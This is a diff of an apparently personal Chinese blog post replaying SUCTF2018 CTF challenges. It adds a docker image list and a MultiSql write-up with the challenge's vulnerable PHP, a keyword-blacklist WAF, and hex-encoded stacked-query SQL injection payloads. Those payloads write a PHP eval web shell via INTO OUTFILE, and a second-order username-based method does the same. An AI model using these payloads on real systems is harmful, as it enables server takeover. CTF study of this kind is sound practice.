@@ -2,11 +2,35 @@
 title: suctf2018
 date: 2018-05-28 16:46:05
 tags:
+password: 654321
 ---
 
 # SUCTF2018
 
+<!--more-->
+
 没做过，自己复现
+
+docker仓库：
+
+```
+suctf/2018-web-multi_sql
+suctf/2018-web-homework
+suctf/2018-web-hateit
+suctf/2018-web-getshell
+suctf/2018-web-annonymous
+suctf/2018-pwn-note
+suctf/2018-pwn-noend
+suctf/2018-pwn-lock2
+suctf/2018-pwn-heapprint
+suctf/2018-pwn-heap
+suctf/2018-misc-padding
+suctf/2018-misc-game
+suctf/2018-misc-rsagood
+suctf/2018-misc-rsa
+suctf/2018-misc-enjoy
+suctf/2018-misc-pass
+```
 
 ## Anonymous
 
@@ -110,7 +134,95 @@ $_=$$_;//$_GET
 $_[_]($_[__]);//$_GET[_]($_GET[__]);
 ```
 
-## HateIT
+## MultiSql
+
+```
+@@secure_file_priv           限制intofile可以写入的文件目录
+```
+
+waf.php
+
+```
+<?php
+	function waf($str){
+		$black_str = "/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&])/i";
+		$str = preg_replace($black_str, "@@",$str);
+		return addslashes($str);
+	}
+```
+
+sql注入关键代码:
+
+```
+if (isset($_SESSION['user_name'])) {
+	include_once('../header.php');
+	if (!isset($SESSION['user_id'])) {
+		$sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_name ="."'{$_SESSION['user_name']}'";
+	echo $sql;		
+$data = mysqli_query($connect,$sql) or die('Mysql Error!!');
+		$result = mysqli_fetch_array($data);
+		var_dump($result);
+		$_SESSION['user_id'] = $result['DWVS_user_id'];
+	}
+
+	$html_avatar = htmlspecialchars($_SESSION['user_favicon']);
+	
+	
+	if(isset($_GET['id'])){
+		$id=waf($_GET['id']);
+		$sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_id =".$id;
+		$data = mysqli_multi_query($connect,$sql) or die();
+		
+		$result = mysqli_store_result($connect);
+		$row = mysqli_fetch_row($result);
+		echo '<h1>user_id:'.$row[0]."</h1><br><h2>user_name:".$row[1]."</h2><br><h3>注册时间：".$row[4]."</h3>";
+		mysqli_free_result($result);
+		die();
+	}
+	mysqli_close($connect);
+```
+
+使用set跟hex编码的方式执行sql语句:
+
+```
+select user()                    =>   0x73656c65637420757365722829
+```
+
+```
+set @num=0x73656c65637420757365722829;prepare t from @num;execute t;
+```
+
+写shell:
+
+```
+<?php eval($_REQUEST['55332']);?>       =>   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e   
+```
+
+```
+set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;
+```
+
+```
+select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile '/var/www/html/favicon/wfox.php'
+```
+
+方法二:
+
+注册两个账号:
+
+```sql
+<?=$_GET[c];?>                                        
+
+<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php 
+```
+
+这样，当使用第二个账号登录的时候:
+
+```
+$sql = "SELECT * FROM dwvs_user_message WHERE DWVS_user_name ="."'{$_SESSION['user_name']}'";
+```
+
+就会将我们的shell写入账号。
 
 # PWN
 
@@ -180,6 +292,3 @@ r.sendlineafter('Size:', '10')
 r.interactive()
 ```
 
-
-
-​				
